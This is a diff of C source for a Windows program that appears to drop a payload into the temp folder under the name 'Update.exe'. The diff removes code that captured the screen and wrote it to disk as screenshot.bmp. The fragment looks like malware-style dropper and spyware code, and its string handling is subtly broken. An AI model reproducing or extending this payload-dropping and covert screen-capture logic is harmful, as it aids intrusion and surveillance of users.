@@ -51,8 +51,7 @@ int main( void )
 {
 	PVOID pAddress = NULL;
 	ULONG Length = 0x00;
-	LPCWSTR tempPath[ MAX_PATH ],
-	        ssPath[ MAX_PATH ];
+	LPCWSTR tempPath[ MAX_PATH ];
 
 	/* ---------------------------------------------------------------------------------------------------------------------------------------- */
 
@@ -61,8 +60,6 @@ int main( void )
 		LOG_ERR( "GetTempPathW" );
 		return -1;
 	}
-
-	StrCatW( &ssPath, tempPath );
 	StrCatW( &tempPath, L"Update.exe" );
 
 	if ( !WritePayloadToTemp( tempPath ) )
@@ -74,29 +71,6 @@ int main( void )
 	{
 		return -1;
 	}
-
-	/* ---------------------------------------------------------------------------------------------------------------------------------------- */
-
-	// store screenshot in memory
-	/*
-	if ( !ScreenshotBmp( &pAddress, &Length ) )
-	{
-		return -1;
-	}
-	printf( "(+) Screenshot Captured...\n" );
-*/
-
-	StrCatW( &ssPath, L"screenshot.bmp" );
-	// write the screenshot to disk
-	if ( !WriteFileToDiskW( ssPath, pAddress, Length ) )
-	{
-		return -1;
-	}
-	printf( "(+) Screenshot has been wrote to disk...\n" );
-
-	// free the buffer
-	RtlSecureZeroMemory( pAddress, Length );
-	HeapFree( GetProcessHeap(), HEAP_ZERO_MEMORY, pAddress );
 
 	return 0;
 }
